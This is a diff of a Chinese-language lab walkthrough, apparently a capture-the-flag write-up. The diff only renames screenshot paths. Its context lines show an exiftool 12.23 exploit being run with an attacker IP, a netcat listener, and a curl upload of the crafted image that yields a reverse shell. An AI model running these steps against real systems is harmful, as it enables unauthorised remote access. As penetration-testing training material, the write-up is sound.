@@ -69,7 +69,7 @@ file backup
 searchsploit exiftool 12.23
 ```
 
-<figure><img src="../.gitbook/assets/10 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/10 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
@@ -82,9 +82,9 @@ python3 50911.py -h
 python3 50911.py -s 192.168.45.200 4444
 ```
 
-<figure><img src="../.gitbook/assets/11 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/11 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/12 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/12 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### GET SHELL
 
@@ -102,7 +102,7 @@ nc -lvnp 4444
 curl -v -F myFile=@image.jpg http://192.168.160.183/exiftest.php
 ```
 
-<figure><img src="../.gitbook/assets/13 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/13 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 成功获得反弹shell，并查找到local.txt文件：
 
